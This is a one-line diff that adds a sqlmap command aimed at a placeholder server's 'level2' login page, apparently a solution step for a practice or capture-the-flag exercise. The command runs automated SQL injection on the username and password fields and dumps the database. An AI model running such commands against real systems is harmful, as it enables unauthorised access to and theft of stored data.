@@ -1,0 +1,1 @@
+sqlmap -u "http://yourserver/level2?username=admin&password=test" --dump
